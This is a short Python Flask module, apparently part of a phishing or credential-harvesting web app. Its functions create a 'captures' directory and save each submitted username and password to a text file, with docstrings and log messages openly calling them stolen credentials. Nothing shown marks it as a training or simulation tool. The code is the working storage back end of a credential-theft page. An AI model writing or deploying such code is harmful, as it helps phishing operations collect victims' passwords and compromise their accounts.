from pathlib import Path
from re import sub
from flask import current_app

def get_captures_dir() -> Path:
    """Returns the path to the captures directory"""
    return Path(current_app.root_path).parent / "captures"

def make_captures_dir() -> None:
    """Creates the captures directory if it doesn't exist"""
    get_captures_dir().mkdir(exist_ok=True)

def save_stolen_credentials(username: str, password: str) -> None:
    """Saves the stolen credentials to a text file in the captures directory"""
    try:
        make_captures_dir()

        safe_username = sub(r"[^a-zA-Z0-9._-]", "_", username)

        file_name = f"{safe_username}.txt"
        file = get_captures_dir() / file_name
        content = f"Username: {username}\nPassword: {password}\n"

        file.write_text(content, encoding="utf-8")

        current_app.logger.info(f"Stolen credentials saved to {file.resolve()}")

    except Exception as e:
        current_app.logger.exception(f"Failed to save stolen credentials")
